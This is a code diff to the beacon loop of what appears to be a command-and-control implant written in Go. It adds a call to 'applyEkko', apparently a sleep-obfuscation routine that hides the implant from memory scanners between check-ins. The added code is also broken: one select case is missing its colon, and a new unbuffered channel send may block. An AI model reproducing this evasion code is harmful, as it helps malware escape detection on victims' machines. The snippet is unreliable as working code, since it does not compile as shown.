@@ -302,6 +302,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// BeaconMain - Is executed in it's own goroutine as the function will block
 	// until all tasks complete (in success or failure), if a task handler blocks
 	// forever it will simply block this set of tasks instead of the entire beacon
+	completion := make(chan bool)
 	errors := make(chan error)
 	shortCircuit := make(chan struct{})
 	for {
@@ -320,6 +321,8 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 				// the current sleep and tell the server when the next checkin will
 				// be based on the new interval.
 				shortCircuit <- struct{}{}
+			} else { // err is nil
+				completion <- true
 			}
 		}()
 
@@ -329,7 +332,12 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		select {
 		case <-errors:
 			return err
-		case <-time.After(duration):
+		case <-completion
+			// check if there's still time to sleep
+			secondsUntilNextCheckIn := time.Until(nextCheckin).Seconds()
+			if secondsUntilNextCheckIn > 1 {
+				applyEkko(secondsUntilNextCheckIn)
+			}
 		case <-shortCircuit:
 			// Short circuit current duration with no error
 		}
